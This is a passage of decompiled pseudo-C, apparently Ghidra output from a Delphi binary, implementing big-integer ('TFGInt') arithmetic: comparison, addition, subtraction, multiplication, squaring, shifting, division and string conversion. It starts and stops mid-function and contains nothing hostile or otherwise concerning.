    FUN_00404bb4(local_24,(uint *)&DAT_00415e78);
    if (!(bool)uVar7) break;
    FUN_00404d08((int *)&local_8,1,1);
  }
  local_c = FUN_00404a68((int)local_8);
  if (local_c < 0) {
    local_c = local_c + 3;
  }
  local_c = local_c >> 2;
  uVar3 = FUN_00404a68((int)local_8);
  uVar3 = uVar3 & 0x80000003;
  if ((int)uVar3 < 0) {
    uVar3 = (uVar3 - 1 | 0xfffffffc) + 1;
  }
  if (uVar3 != 0) {
    local_c = local_c + 1;
  }
  FUN_00405948((int **)(param_2 + 4),(int)&DAT_00415430,1);
  **(int **)(param_2 + 4) = local_c;
  iVar2 = local_c + -1;
  if (iVar2 != 0) {
    iVar6 = 1;
    do {
      piVar8 = (int *)&stack0xffffffe8;
      iVar4 = FUN_00404a68((int)local_8);
      FUN_00404cc8((int)local_8,iVar4 + -3,4,piVar8);
      pbVar5 = FUN_00408178(unaff_ESI);
      *(byte **)(*(int *)(param_2 + 4) + iVar6 * 4) = pbVar5;
      iVar4 = FUN_00404a68((int)local_8);
      FUN_00404d08((int *)&local_8,iVar4 + -3,4);
      iVar6 = iVar6 + 1;
      iVar2 = iVar2 + -1;
    } while (iVar2 != 0);
  }
  pbVar5 = FUN_00408178(local_8);
  *(byte **)(*(int *)(param_2 + 4) + local_c * 4) = pbVar5;
  FUN_004047a8((int *)&stack0xffffffec);
  while ((uVar7 = (undefined)((uint)uVar9 >> 0x18), **(int **)(param_2 + 4) != 1 ||
         (*(int *)(*(int *)(param_2 + 4) + 4) != 0))) {
    FUN_00415b90((int)param_2,2,(undefined2 *)((int)&uStack16 + 2));
    FUN_0040803c(uStack16 >> 0x10,(int *)&local_28);
    FUN_00404ab4((int *)&stack0xffffffec,local_28,unaff_EBX);
  }
  if (unaff_EBX == (undefined4 *)0x0) {
    FUN_00404840((int *)&stack0xffffffec,(int)&DAT_00415e78);
  }
  FUN_00415fa8((int)param_2);
  FUN_0041595c((char *)unaff_EBX,param_2);
  *param_2 = uVar7;
  *in_FS_OFFSET = local_28;
  local_20 = (uint *)&LAB_00415e5c;
  local_24 = (uint *)0x415e3f;
  FUN_004047cc((int *)&local_28,3);
  local_24 = (uint *)0x415e4c;
  FUN_004047cc((int *)&stack0xffffffe8,2);
  local_24 = (uint *)0x415e54;
  FUN_004047a8((int *)&local_8);
  return;
}



void FUN_00415e7c(char *param_1,char **param_2)

{
  int iVar1;
  undefined extraout_CL;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack40;
  undefined *puStack36;
  undefined *puStack32;
  undefined local_14 [4];
  uint *local_10;
  uint local_c;
  undefined4 *local_8;
  
  local_8 = (undefined4 *)0x0;
  puStack32 = (undefined *)0x415e9b;
  FUN_00405100((int)local_14,(int)&DAT_00415450);
  puStack36 = &LAB_00415f80;
  uStack40 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack40;
  puStack32 = &stack0xfffffffc;
  FUN_004164f8(param_1,local_14);
  FUN_004047a8((int *)param_2);
  while ((1 < *local_10 || (local_10[1] != 0))) {
    FUN_0041638c((int)local_14,10000,&local_c);
    FUN_00408128((int *)&local_8,0,extraout_CL,(char)local_c);
    while( true ) {
      iVar1 = FUN_00404a68((int)local_8);
      if (3 < iVar1) break;
      FUN_00404ab4((int *)&local_8,(undefined4 *)&DAT_00415f98,local_8);
    }
    FUN_00404ab4((int *)param_2,local_8,(undefined4 *)*param_2);
  }
  FUN_00404ab4((int *)param_2,(undefined4 *)&DAT_00415f98,(undefined4 *)*param_2);
  while( true ) {
    iVar1 = FUN_00404a68((int)*param_2);
    if ((iVar1 < 2) || (**param_2 != '0')) break;
    FUN_00404d08((int *)param_2,1,1);
  }
  if (*param_1 == '\0') {
    FUN_00404ab4((int *)param_2,(undefined4 *)&DAT_00415fa4,(undefined4 *)*param_2);
  }
  *in_FS_OFFSET = uStack40;
  puStack32 = &LAB_00415f87;
  puStack36 = (undefined *)0x415f77;
  FUN_004051d0((int)local_14,(int)&DAT_00415450);
  puStack36 = (undefined *)0x415f7f;
  FUN_004047a8((int *)&local_8);
  return;
}



void FUN_00415fa8(int param_1)

{
  FUN_00405a48((int *)(param_1 + 4),(int)&DAT_00415430);
  return;
}



uint FUN_00415fbc(uint param_1,int param_2)

{
  uint uVar1;
  uint uVar2;
  uint local_10;
  
  local_10 = 3;
  uVar2 = **(uint **)(param_2 + 4);
  if (uVar2 < **(uint **)(param_1 + 4)) {
    local_10 = 0;
  }
  else if (**(uint **)(param_1 + 4) < uVar2) {
    local_10 = 1;
  }
  else {
    for (; (*(int *)(*(int *)(param_1 + 4) + uVar2 * 4) ==
            *(int *)(*(int *)(param_2 + 4) + uVar2 * 4) && (1 < uVar2)); uVar2 = uVar2 - 1) {
    }
    uVar1 = *(uint *)(*(int *)(param_2 + 4) + uVar2 * 4);
    uVar2 = *(uint *)(*(int *)(param_1 + 4) + uVar2 * 4);
    if (uVar1 == uVar2) {
      local_10 = 2;
    }
    else if (uVar2 < uVar1) {
      local_10 = 1;
    }
    else if (uVar1 < uVar2) {
      local_10 = 0;
    }
  }
  return param_1 & 0xffffff00 | local_10;
}



void FUN_00416028(char *param_1,char *param_2,char *param_3)

{
  uint uVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  
  uVar5 = **(uint **)(param_1 + 4);
  uVar3 = **(uint **)(param_2 + 4);
  if (uVar5 < uVar3) {
    FUN_00416028(param_2,param_1,param_3);
  }
  else if (*param_1 == *param_2) {
    *param_3 = *param_1;
    FUN_00405948((int **)(param_3 + 4),(int)&DAT_00415430,1);
    uVar4 = 0;
    if (uVar3 != 0) {
      iVar2 = 1;
      uVar1 = uVar3;
      do {
        uVar4 = *(int *)(*(int *)(param_1 + 4) + iVar2 * 4) +
                *(int *)(*(int *)(param_2 + 4) + iVar2 * 4) + uVar4;
        *(uint *)(*(int *)(param_3 + 4) + iVar2 * 4) = uVar4 & 0x7fffffff;
        uVar4 = uVar4 >> 0x1f;
        iVar2 = iVar2 + 1;
        uVar1 = uVar1 - 1;
      } while (uVar1 != 0);
    }
    uVar3 = uVar3 + 1;
    if (uVar3 <= uVar5) {
      iVar2 = (uVar5 - uVar3) + 1;
      do {
        uVar4 = *(int *)(*(int *)(param_1 + 4) + uVar3 * 4) + uVar4;
        *(uint *)(*(int *)(param_3 + 4) + uVar3 * 4) = uVar4 & 0x7fffffff;
        uVar4 = uVar4 >> 0x1f;
        uVar3 = uVar3 + 1;
        iVar2 = iVar2 + -1;
      } while (iVar2 != 0);
    }
    uVar5 = uVar5 + 1;
    **(uint **)(param_3 + 4) = uVar5;
    *(uint *)(*(int *)(param_3 + 4) + uVar5 * 4) = uVar4;
    for (; (*(int *)(*(int *)(param_3 + 4) + uVar5 * 4) == 0 && (1 < uVar5)); uVar5 = uVar5 - 1) {
    }
    if (uVar5 != **(uint **)(param_3 + 4)) {
      FUN_00405948((int **)(param_3 + 4),(int)&DAT_00415430,1);
    }
    **(uint **)(param_3 + 4) = uVar5;
  }
  else {
    uVar4 = FUN_00415fbc((uint)param_2,(int)param_1);
    if ((char)uVar4 == '\0') {
      FUN_00416028(param_2,param_1,param_3);
    }
    else {
      FUN_00405948((int **)(param_3 + 4),(int)&DAT_00415430,1);
      uVar4 = 0;
      if (uVar3 != 0) {
        iVar2 = 1;
        uVar1 = uVar3;
        do {
          uVar4 = ((*(int *)(*(int *)(param_1 + 4) + iVar2 * 4) + -0x80000000) -
                  *(int *)(*(int *)(param_2 + 4) + iVar2 * 4)) - uVar4;
          *(uint *)(*(int *)(param_3 + 4) + iVar2 * 4) = uVar4 & 0x7fffffff;
          uVar4 = (uint)(uVar4 < 0x80000000);
          iVar2 = iVar2 + 1;
          uVar1 = uVar1 - 1;
        } while (uVar1 != 0);
      }
      uVar3 = uVar3 + 1;
      uVar1 = uVar5;
      if (uVar3 <= uVar5) {
        iVar2 = (uVar5 - uVar3) + 1;
        do {
          uVar4 = (*(int *)(*(int *)(param_1 + 4) + uVar3 * 4) + -0x80000000) - uVar4;
          *(uint *)(*(int *)(param_3 + 4) + uVar3 * 4) = uVar4 & 0x7fffffff;
          uVar4 = (uint)(uVar4 < 0x80000000);
          uVar3 = uVar3 + 1;
          iVar2 = iVar2 + -1;
        } while (iVar2 != 0);
      }
      for (; (*(int *)(*(int *)(param_3 + 4) + uVar1 * 4) == 0 && (1 < uVar1)); uVar1 = uVar1 - 1) {
      }
      if (uVar1 != uVar5) {
        FUN_00405948((int **)(param_3 + 4),(int)&DAT_00415430,1);
      }
      **(uint **)(param_3 + 4) = uVar1;
      *param_3 = *param_1;
    }
  }
  return;
}



void FUN_0041626c(char *param_1)

{
  if (*param_1 == '\0') {
    *param_1 = '\x01';
    return;
  }
  *param_1 = '\0';
  return;
}



void FUN_0041627c(char *param_1,char *param_2,char *param_3)

{
  FUN_0041626c(param_2);
  FUN_00416028(param_1,param_2,param_3);
  FUN_0041626c(param_2);
  return;
}



void FUN_004162a4(int param_1,int param_2)

{
  uint uVar1;
  undefined4 extraout_ECX;
  undefined4 uVar2;
  undefined4 extraout_ECX_00;
  int extraout_EDX;
  int iVar3;
  int iVar4;
  uint uVar5;
  int local_1c;
  
  local_1c = **(int **)(param_1 + 4);
  FUN_00405948((int **)(param_1 + 4),(int)&DAT_00415430,1);
  uVar5 = 0;
  if (local_1c != 0) {
    iVar4 = 1;
    uVar2 = extraout_ECX;
    iVar3 = local_1c;
    do {
      uVar1 = FUN_00405670(*(int *)(*(int *)(param_1 + 4) + iVar4 * 4),0,uVar2,param_2);
      *(uint *)(*(int *)(param_1 + 4) + iVar4 * 4) = uVar5 + uVar1 & 0x7fffffff;
      uVar5 = uVar5 + uVar1 >> 0x1f | (extraout_EDX + (uint)CARRY4(uVar5,uVar1)) * 2;
      iVar4 = iVar4 + 1;
      iVar3 = iVar3 + -1;
      uVar2 = extraout_ECX_00;
    } while (iVar3 != 0);
  }
  if (uVar5 == 0) {
    FUN_00405948((int **)(param_1 + 4),(int)&DAT_00415430,1);
  }
  else {
    local_1c = local_1c + 1;
    *(uint *)(*(int *)(param_1 + 4) + local_1c * 4) = uVar5;
  }
  **(int **)(param_1 + 4) = local_1c;
  return;
}



void FUN_0041638c(int param_1,uint param_2,uint *param_3)

{
  uint *puVar1;
  uint uVar2;
  int iVar3;
  undefined4 extraout_ECX;
  uint *extraout_ECX_00;
  uint uVar4;
  int extraout_EDX;
  uint uVar5;
  uint uVar6;
  uint local_20;
  int local_1c;
  
  uVar6 = **(uint **)(param_1 + 4);
  local_20 = 0;
  local_1c = 0;
  puVar1 = param_3;
  for (uVar5 = uVar6; uVar5 != 0; uVar5 = uVar5 - 1) {
    uVar4 = local_1c << 0x1f | local_20 >> 1;
    uVar2 = *(uint *)(*(int *)(param_1 + 4) + uVar5 * 4) | local_20 << 0x1f;
    iVar3 = FUN_00405694(uVar2,uVar4,puVar1,param_2,0);
    *(int *)(*(int *)(param_1 + 4) + uVar5 * 4) = iVar3;
    local_20 = FUN_00405710(uVar2,uVar4,extraout_ECX,param_2,0);
    puVar1 = extraout_ECX_00;
    local_1c = extraout_EDX;
  }
  *param_3 = local_20;
  for (; (*(int *)(*(int *)(param_1 + 4) + uVar6 * 4) == 0 && (1 < uVar6)); uVar6 = uVar6 - 1) {
  }
  if (uVar6 != **(uint **)(param_1 + 4)) {
    FUN_00405948((int **)(param_1 + 4),(int)&DAT_00415430,1);
    **(uint **)(param_1 + 4) = uVar6;
  }
  return;
}



void FUN_00416468(char *param_1,uint param_2,uint *param_3)

{
  uint *puVar1;
  uint *extraout_ECX;
  int extraout_EDX;
  int iVar2;
  uint local_20;
  int local_1c;
  
  iVar2 = **(int **)(param_1 + 4);
  local_20 = 0;
  local_1c = 0;
  puVar1 = param_3;
  for (; iVar2 != 0; iVar2 = iVar2 + -1) {
    local_20 = FUN_00405710(*(uint *)(*(int *)(param_1 + 4) + iVar2 * 4) | local_20 << 0x1f,
                            local_1c << 0x1f | local_20 >> 1,puVar1,param_2,0);
    puVar1 = extraout_ECX;
    local_1c = extraout_EDX;
  }
  *param_3 = local_20;
  if (*param_1 == '\0') {
    *param_3 = param_2 - *param_3;
  }
  return;
}



void FUN_004164f4(undefined *param_1)

{
  *param_1 = 1;
  return;
}



void FUN_004164f8(undefined *param_1,undefined *param_2)

{
  *param_2 = *param_1;
  FUN_00405a48((int *)(param_2 + 4),(int)&DAT_00415430);
  FUN_00405954(*(int *)(param_1 + 4),(int)&DAT_00415430,0,(int *)(param_2 + 4),
               **(int **)(param_1 + 4) + 1);
  return;
}



void FUN_00416530(int param_1)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  
  uVar4 = 0;
  uVar1 = **(uint **)(param_1 + 4);
  for (uVar3 = uVar1; uVar3 != 0; uVar3 = uVar3 - 1) {
    uVar2 = *(uint *)(*(int *)(param_1 + 4) + uVar3 * 4);
    *(uint *)(*(int *)(param_1 + 4) + uVar3 * 4) = uVar4 | uVar2 >> 1;
    uVar4 = (uVar2 & 1) << 0x1e;
  }
  if ((*(int *)(*(int *)(param_1 + 4) + uVar1 * 4) == 0) && (1 < uVar1)) {
    FUN_00405948((int **)(param_1 + 4),(int)&DAT_00415430,1);
    **(int **)(param_1 + 4) = uVar1 - 1;
  }
  return;
}



void FUN_004165a0(int param_1)

{
  uint uVar1;
  int iVar2;
  int iVar3;
  
  uVar1 = **(uint **)(param_1 + 4);
  if (uVar1 < 2) {
    *(undefined4 *)(*(int *)(param_1 + 4) + 4) = 0;
  }
  else {
    iVar3 = uVar1 - 1;
    if (iVar3 != 0) {
      iVar2 = 1;
      do {
        *(undefined4 *)(*(int *)(param_1 + 4) + iVar2 * 4) =
             *(undefined4 *)(*(int *)(param_1 + 4) + 4 + iVar2 * 4);
        iVar2 = iVar2 + 1;
        iVar3 = iVar3 + -1;
      } while (iVar3 != 0);
    }
    FUN_00405948((int **)(param_1 + 4),(int)&DAT_00415430,1);
    **(int **)(param_1 + 4) = uVar1 - 1;
  }
  return;
}



void FUN_004165f8(int param_1,int param_2)

{
  uint uVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  int iVar6;
  uint uVar7;
  
  uVar1 = **(uint **)(param_1 + 4);
  iVar6 = **(int **)(param_2 + 4);
  uVar7 = 0;
  if (iVar6 != 0) {
    iVar2 = 1;
    iVar5 = iVar6;
    do {
      uVar3 = *(int *)(*(int *)(param_1 + 4) + iVar2 * 4) +
              *(int *)(*(int *)(param_2 + 4) + iVar2 * 4) + uVar7;
      uVar7 = uVar3 >> 0x1f;
      *(uint *)(*(int *)(param_1 + 4) + iVar2 * 4) = uVar3 & 0x7fffffff;
      iVar2 = iVar2 + 1;
      iVar5 = iVar5 + -1;
    } while (iVar5 != 0);
  }
  uVar3 = iVar6 + 1;
  if (uVar3 <= uVar1) {
    iVar6 = (uVar1 - uVar3) + 1;
    do {
      uVar4 = *(int *)(*(int *)(param_1 + 4) + uVar3 * 4) + uVar7;
      uVar7 = uVar4 >> 0x1f;
      *(uint *)(*(int *)(param_1 + 4) + uVar3 * 4) = uVar4 & 0x7fffffff;
      uVar3 = uVar3 + 1;
      iVar6 = iVar6 + -1;
    } while (iVar6 != 0);
  }
  if (uVar7 != 0) {
    FUN_00405948((int **)(param_1 + 4),(int)&DAT_00415430,1);
    **(int **)(param_1 + 4) = uVar1 + 1;
    *(uint *)(*(int *)(param_1 + 4) + 4 + uVar1 * 4) = uVar7;
  }
  return;
}



void FUN_004166b8(int param_1,int param_2)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  int iVar4;
  int iVar5;
  uint uVar6;
  int iVar7;
  uint uVar8;
  
  uVar1 = **(uint **)(param_1 + 4);
  iVar5 = **(int **)(param_2 + 4);
  uVar6 = 0;
  if (iVar5 != 0) {
    iVar7 = 1;
    iVar4 = iVar5;
    do {
      uVar2 = ((*(uint *)(*(int *)(param_1 + 4) + iVar7 * 4) | 0x80000000) -
              *(int *)(*(int *)(param_2 + 4) + iVar7 * 4)) - uVar6;
      uVar6 = (uint)(uVar2 < 0x80000000);
      *(uint *)(*(int *)(param_1 + 4) + iVar7 * 4) = uVar2 & 0x7fffffff;
      iVar7 = iVar7 + 1;
      iVar4 = iVar4 + -1;
    } while (iVar4 != 0);
  }
  uVar8 = iVar5 + 1;
  uVar2 = uVar1;
  if (uVar8 <= uVar1) {
    iVar5 = (uVar1 - uVar8) + 1;
    do {
      uVar3 = (*(uint *)(*(int *)(param_1 + 4) + uVar8 * 4) | 0x80000000) - uVar6;
      uVar6 = (uint)(uVar3 < 0x80000000);
      *(uint *)(*(int *)(param_1 + 4) + uVar8 * 4) = uVar3 & 0x7fffffff;
      uVar8 = uVar8 + 1;
      iVar5 = iVar5 + -1;
    } while (iVar5 != 0);
  }
  for (; (*(int *)(*(int *)(param_1 + 4) + uVar2 * 4) == 0 && (1 < uVar2)); uVar2 = uVar2 - 1) {
  }
  if (uVar2 != uVar1) {
    FUN_00405948((int **)(param_1 + 4),(int)&DAT_00415430,1);
    **(uint **)(param_1 + 4) = uVar2;
  }
  return;
}



void FUN_00416798(char *param_1,char *param_2,undefined *param_3)

{
  int iVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  int extraout_ECX;
  int extraout_EDX;
  int iVar6;
  int iVar7;
  uint uVar8;
  int iVar9;
  uint local_28;
  uint local_18;
  int local_14;
  
  iVar1 = **(int **)(param_1 + 4);
  iVar9 = **(int **)(param_2 + 4);
  local_28 = iVar1 + iVar9;
  FUN_00405948((int **)(param_3 + 4),(int)&DAT_00415430,1);
  if (local_28 != 0) {
    iVar6 = 1;
    local_18 = local_28;
    do {
      *(undefined4 *)(*(int *)(param_3 + 4) + iVar6 * 4) = 0;
      iVar6 = iVar6 + 1;
      local_18 = local_18 - 1;
    } while (local_18 != 0);
  }
  if (iVar9 != 0) {
    iVar7 = 1;
    iVar6 = extraout_ECX;
    local_18 = iVar9;
    do {
      uVar8 = 0;
      if (iVar1 != 0) {
        iVar9 = 1;
        local_14 = iVar1;
        do {
          uVar3 = FUN_00405670(*(int *)(*(int *)(param_1 + 4) + iVar9 * 4),0,iVar6,
                               *(int *)(*(int *)(param_2 + 4) + iVar7 * 4));
          iVar6 = iVar7 + iVar9;
          uVar2 = *(uint *)(*(int *)(param_3 + 4) + -4 + iVar6 * 4);
          uVar4 = uVar2 + uVar3;
          uVar5 = uVar8 + uVar4;
          *(uint *)(*(int *)(param_3 + 4) + -4 + iVar6 * 4) = uVar5 & 0x7fffffff;
          uVar8 = uVar5 >> 0x1f |
                  (extraout_EDX + (uint)CARRY4(uVar2,uVar3) + (uint)CARRY4(uVar8,uVar4)) * 2;
          iVar9 = iVar9 + 1;
          local_14 = local_14 + -1;
        } while (local_14 != 0);
      }
      *(uint *)(*(int *)(param_3 + 4) + (iVar1 + iVar7) * 4) = uVar8;
      iVar7 = iVar7 + 1;
      local_18 = local_18 + -1;
    } while (local_18 != 0);
  }
  **(uint **)(param_3 + 4) = local_28;
  for (; (*(int *)(*(int *)(param_3 + 4) + local_28 * 4) == 0 && (1 < local_28));
      local_28 = local_28 - 1) {
  }
  if (**(uint **)(param_3 + 4) != local_28) {
    FUN_00405948((int **)(param_3 + 4),(int)&DAT_00415430,1);
    **(uint **)(param_3 + 4) = local_28;
  }
  if (*param_1 == *param_2) {
    *param_3 = 1;
  }
  else {
    *param_3 = 0;
  }
  return;
}



void FUN_00416948(int param_1,undefined *param_2)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint extraout_ECX;
  int iVar6;
  int extraout_EDX;
  int extraout_EDX_00;
  int iVar7;
  uint uVar8;
  uint local_30;
  uint local_28;
  uint local_18;
  int local_14;
  
  uVar1 = **(uint **)(param_1 + 4);
  local_30 = uVar1 * 2;
  FUN_00405948((int **)(param_2 + 4),(int)&DAT_00415430,1);
  **(uint **)(param_2 + 4) = local_30;
  if (local_30 != 0) {
    iVar7 = 1;
    local_18 = local_30;
    do {
      *(undefined4 *)(*(int *)(param_2 + 4) + iVar7 * 4) = 0;
      iVar7 = iVar7 + 1;
      local_18 = local_18 - 1;
    } while (local_18 != 0);
  }
  if (uVar1 != 0) {
    iVar7 = 1;
    local_28 = extraout_ECX;
    local_18 = uVar1;
    do {
      iVar6 = *(int *)(*(int *)(param_1 + 4) + iVar7 * 4);
      uVar2 = FUN_00405670(iVar6,0,local_28,iVar6);
      iVar6 = iVar7 * 2;
      uVar8 = *(uint *)(*(int *)(param_2 + 4) + -4 + iVar7 * 8);
      uVar3 = uVar8 + uVar2;
      *(uint *)(*(int *)(param_2 + 4) + -4 + iVar7 * 8) = uVar3 & 0x7fffffff;
      local_28 = uVar3 >> 0x1f | (extraout_EDX + (uint)CARRY4(uVar8,uVar2)) * 2;
      uVar8 = iVar7 + 1;
      if (uVar8 <= uVar1) {
        local_14 = (uVar1 - uVar8) + 1;
        do {
          uVar3 = FUN_00405670(*(int *)(*(int *)(param_1 + 4) + iVar7 * 4) * 2,0,iVar6,
                               *(int *)(*(int *)(param_1 + 4) + uVar8 * 4));
          iVar6 = uVar8 + iVar7;
          uVar2 = *(uint *)(*(int *)(param_2 + 4) + -4 + iVar6 * 4);
          uVar4 = uVar2 + uVar3;
          uVar5 = local_28 + uVar4;
          *(uint *)(*(int *)(param_2 + 4) + -4 + iVar6 * 4) = uVar5 & 0x7fffffff;
          local_28 = uVar5 >> 0x1f |
                     (extraout_EDX_00 + (uint)CARRY4(uVar2,uVar3) + (uint)CARRY4(local_28,uVar4)) *
                     2;
          uVar8 = uVar8 + 1;
          local_14 = local_14 + -1;
        } while (local_14 != 0);
      }
      *(uint *)(*(int *)(param_2 + 4) + (uVar1 + iVar7) * 4) = local_28;
      iVar7 = iVar7 + 1;
      local_18 = local_18 - 1;
    } while (local_18 != 0);
  }
  *param_2 = 1;
  for (; (*(int *)(*(int *)(param_2 + 4) + local_30 * 4) == 0 && (1 < local_30));
      local_30 = local_30 - 1) {
  }
  if (uVar1 * 2 != local_30) {
    FUN_00405948((int **)(param_2 + 4),(int)&DAT_00415430,1);
    **(uint **)(param_2 + 4) = local_30;
  }
  return;
}



void FUN_00416b3c(int param_1)

{
  int iVar1;
  undefined4 uVar2;
  int iVar3;
  undefined4 uVar4;
  int iVar5;
  
  iVar1 = **(int **)(param_1 + 4);
  FUN_00405948((int **)(param_1 + 4),(int)&DAT_00415430,1);
  iVar5 = iVar1 + 1;
  if (0 < iVar5) {
    iVar3 = 1;
    uVar4 = 0;
    do {
      uVar2 = *(undefined4 *)(*(int *)(param_1 + 4) + iVar3 * 4);
      *(undefined4 *)(*(int *)(param_1 + 4) + iVar3 * 4) = uVar4;
      iVar3 = iVar3 + 1;
      iVar5 = iVar5 + -1;
      uVar4 = uVar2;
    } while (iVar5 != 0);
  }
  **(int **)(param_1 + 4) = iVar1 + 1;
  return;
}



void FUN_00416b98(char *param_1,char *param_2,char *param_3,char *param_4)

{
  int *piVar1;
  char cVar2;
  char cVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  int extraout_EDX;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack96;
  undefined *puStack92;
  undefined *puStack88;
  int local_48;
  uint local_44;
  int local_40;
  int local_38;
  int local_34;
  int *local_2c [2];
  char local_24 [4];
  uint *local_20;
  undefined local_1c [8];
  char local_14 [8];
  char *local_c;
  char *local_8;
  
  puStack88 = (undefined *)0x416bba;
  local_c = param_2;
  local_8 = param_1;
  FUN_00405100((int)local_14,(int)&DAT_00415450);
  puStack88 = (undefined *)0x416bc8;
  FUN_00405100((int)local_1c,(int)&DAT_00415450);
  puStack88 = (undefined *)0x416bd6;
  FUN_00405100((int)local_24,(int)&DAT_00415450);
  puStack88 = (undefined *)0x416be4;
  FUN_00405100((int)local_2c,(int)&DAT_00415450);
  puStack92 = &LAB_00416f10;
  uStack96 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack96;
  cVar2 = *local_8;
  cVar3 = *local_c;
  puStack88 = &stack0xfffffffc;
  FUN_004164f4(local_8);
  FUN_004164f4(local_c);
  FUN_004164f8(local_8,param_4);
  FUN_004164f8(local_c,local_24);
  uVar6 = FUN_00415fbc((uint)local_8,(int)local_c);
  if ((char)uVar6 == '\x01') {
    FUN_00415c1c(&DAT_00416f28,param_3);
  }
  else {
    local_34 = **(int **)(local_8 + 4) - **(int **)(local_c + 4);
    FUN_00405948((int **)(param_3 + 4),(int)&DAT_00415430,1);
    **(int **)(param_3 + 4) = local_34 + 1;
    if (local_34 != 0) {
      local_38 = 1;
      local_48 = local_34;
      do {
        FUN_00416b3c((int)local_24);
        *(undefined4 *)(*(int *)(param_3 + 4) + local_38 * 4) = 0;
        local_38 = local_38 + 1;
        local_48 = local_48 + -1;
      } while (local_48 != 0);
    }
    local_34 = local_34 + 1;
    *(undefined4 *)(*(int *)(param_3 + 4) + local_34 * 4) = 0;
    while (uVar6 = FUN_00415fbc((uint)param_4,(int)local_c), (char)uVar6 != '\x01') {
      while (uVar6 = FUN_00415fbc((uint)param_4,(int)local_24), (char)uVar6 != '\x01') {
        uVar6 = **(uint **)(param_4 + 4);
        if (*local_20 < uVar6) {
          uVar4 = *(uint *)(*(int *)(param_4 + 4) + uVar6 * 4);
          uVar7 = uVar4 * -0x80000000;
          uVar5 = *(uint *)(*(int *)(param_4 + 4) + -4 + uVar6 * 4);
          local_44 = FUN_00405694(uVar5 + uVar7,(uVar4 >> 1) + (uint)CARRY4(uVar5,uVar7),uVar6,
                                  local_20[*local_20] + 1,0);
          local_40 = extraout_EDX;
        }
        else {
          local_44 = *(uint *)(*(int *)(param_4 + 4) + uVar6 * 4) / (local_20[*local_20] + 1);
          local_40 = 0;
        }
        if (local_40 == 0 && local_44 == 0) {
          piVar1 = (int *)(*(int *)(param_3 + 4) + local_34 * 4);
          *piVar1 = *piVar1 + 1;
          FUN_004166b8((int)param_4,(int)local_24);
        }
        else {
          FUN_004164f8(local_24,(undefined *)local_2c);
          FUN_004162a4((int)local_2c,local_44);
          FUN_004166b8((int)param_4,(int)local_2c);
          piVar1 = (int *)(*(int *)(param_3 + 4) + local_34 * 4);
          *piVar1 = *piVar1 + local_44;
          uVar6 = FUN_00415fbc((uint)param_4,(int)local_2c);
          if ((char)uVar6 != '\x01') {
            piVar1 = (int *)(*(int *)(param_3 + 4) + local_34 * 4);
            *piVar1 = *piVar1 + local_44;
            FUN_004166b8((int)param_4,(int)local_2c);
          }
          FUN_00415fa8((int)local_2c);
        }
      }
      if ((**(uint **)(param_4 + 4) < *local_20 || **(uint **)(param_4 + 4) == *local_20) &&
         (uVar6 = FUN_00415fbc((uint)local_24,(int)local_c), (char)uVar6 != '\x02')) {
        FUN_004165a0((int)local_24);
        local_34 = local_34 + -1;
      }
    }
  }
  for (uVar6 = **(uint **)(param_3 + 4);
      (1 < uVar6 && (*(int *)(*(int *)(param_3 + 4) + uVar6 * 4) == 0)); uVar6 = uVar6 - 1) {
  }
  if (uVar6 < **(uint **)(param_3 + 4)) {
    FUN_00405948((int **)(param_3 + 4),(int)&DAT_00415430,1);
    **(uint **)(param_3 + 4) = uVar6;
  }
  *param_3 = '\x01';
  FUN_00415fa8((int)local_24);
  FUN_00415c1c(&DAT_00416f28,local_1c);
  FUN_00415c1c(&DAT_00416f34,local_14);
  if (cVar2 == '\0') {
    uVar6 = FUN_00415fbc((uint)param_4,(int)local_1c);
    if ((char)uVar6 != '\x02') {
      FUN_00416028(param_3,local_14,local_24);
      FUN_00415fa8((int)param_3);
      FUN_004164f8(local_24,param_3);
      FUN_00415fa8((int)local_24);
      FUN_0041627c(local_c,param_4,local_24);
      FUN_00415fa8((int)param_4);
      FUN_004164f8(local_24,param_4);
      FUN_00415fa8((int)local_24);
    }
    if (cVar3 == '\x01') {
      *param_3 = '\0';
    }
  }
  else {
    *param_3 = cVar3;
  }
  FUN_00415fa8((int)local_14);
  FUN_00415fa8((int)local_1c);
  *local_8 = cVar2;
  *local_c = cVar3;
  *in_FS_OFFSET = uStack96;
  puStack88 = &LAB_00416f17;
  puStack92 = (undefined *)0x416f0f;
  FUN_0040521c(local_2c,"\x0e\x06TFGInt\b",4);
  return;
}



void FUN_00416f38(char *param_1,char *param_2,char *param_3)

{
  char cVar1;
  char cVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  int iVar7;
  uint uVar8;
  int extraout_EDX;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack80;
  undefined *puStack76;
  undefined *puStack72;
  uint local_3c;
  int local_38;
  int *local_2c [2];
  char local_24 [4];
  uint *local_20;
  undefined local_1c [8];
  undefined local_14 [8];
  char *local_c;
  char *local_8;
  
  puStack72 = (undefined *)0x416f56;
  local_c = param_2;
  local_8 = param_1;
  FUN_00405100((int)local_14,(int)&DAT_00415450);
  puStack72 = (undefined *)0x416f64;
  FUN_00405100((int)local_1c,(int)&DAT_00415450);
  puStack72 = (undefined *)0x416f72;
  FUN_00405100((int)local_24,(int)&DAT_00415450);
  puStack72 = (undefined *)0x416f80;
  FUN_00405100((int)local_2c,(int)&DAT_00415450);
  puStack76 = &LAB_004171ba;
  uStack80 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack80;
  cVar1 = *local_8;
  cVar2 = *local_c;
  puStack72 = &stack0xfffffffc;
  FUN_004164f4(local_8);
  FUN_004164f4(local_c);
  FUN_004164f8(local_8,param_3);
  FUN_004164f8(local_c,local_24);
  uVar6 = FUN_00415fbc((uint)local_8,(int)local_c);
  if ((char)uVar6 != '\x01') {
    for (iVar7 = **(int **)(local_8 + 4) - **(int **)(local_c + 4); iVar7 != 0; iVar7 = iVar7 + -1)
    {
